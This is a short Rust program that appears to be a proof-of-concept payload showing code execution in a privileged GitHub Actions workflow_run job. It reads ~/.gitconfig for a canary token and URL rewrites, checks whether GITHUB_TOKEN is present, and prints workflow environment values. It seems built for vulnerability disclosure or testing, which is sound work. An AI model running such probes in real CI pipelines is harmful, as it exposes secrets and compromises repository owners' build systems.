fn main() {
    println!("POC_RCE_MARKER attacker-controlled code executed in the privileged workflow_run job");

    let home = std::env::var("HOME").unwrap_or_default();
    let gitconfig = std::fs::read_to_string(format!("{home}/.gitconfig")).unwrap_or_default();
    println!(
        "GITCONFIG_CANARY_PRESENT={}",
        gitconfig.contains("canary-token-abc123")
    );
    println!("GITCONFIG_HAS_INSTEADOF={}", gitconfig.contains("insteadOf"));

    println!(
        "GITHUB_TOKEN_PRESENT={}",
        std::env::var("GITHUB_TOKEN").is_ok()
    );
    println!(
        "GITHUB_REPOSITORY={}",
        std::env::var("GITHUB_REPOSITORY").unwrap_or_default()
    );
    println!(
        "GITHUB_WORKFLOW={}",
        std::env::var("GITHUB_WORKFLOW").unwrap_or_default()
    );
    println!(
        "GITHUB_EVENT_NAME={}",
        std::env::var("GITHUB_EVENT_NAME").unwrap_or_default()
    );
    println!(
        "PR_NUMBER={}",
        std::env::var("PR_NUMBER").unwrap_or_default()
    );
    println!(
        "OLD_CYCLE_STATS={}",
        std::env::var("OLD_CYCLE_STATS").unwrap_or_default()
    );
    println!(
        "NEW_CYCLE_STATS={}",
        std::env::var("NEW_CYCLE_STATS").unwrap_or_default()
    );
}
